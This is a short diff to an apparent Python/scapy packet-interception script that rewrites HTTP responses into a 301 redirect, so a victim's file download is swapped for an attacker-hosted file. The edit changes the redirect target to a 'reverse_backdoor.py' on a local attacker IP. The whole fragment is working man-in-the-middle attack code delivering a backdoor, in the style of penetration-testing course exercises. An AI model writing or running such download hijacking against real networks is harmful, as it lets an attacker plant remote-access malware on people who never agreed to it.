@@ -42,7 +42,7 @@ def process_packet(packet):
                 print("[+] Matching HTTP response found. Redirecting file download...")
                 redirect_payload = (
                     b"HTTP/1.1 301 Moved Permanently\r\n"
-                    b"Location: http://192.168.119.139/evilfiles/testevil.exe\r\n"
+                    b"Location: http://192.168.119.139/evilfiles/reverse_backdoor.py\r\n"
                     b"\r\n"
                 )
                 modified_packet = set_packet(scapy_packet, redirect_payload)
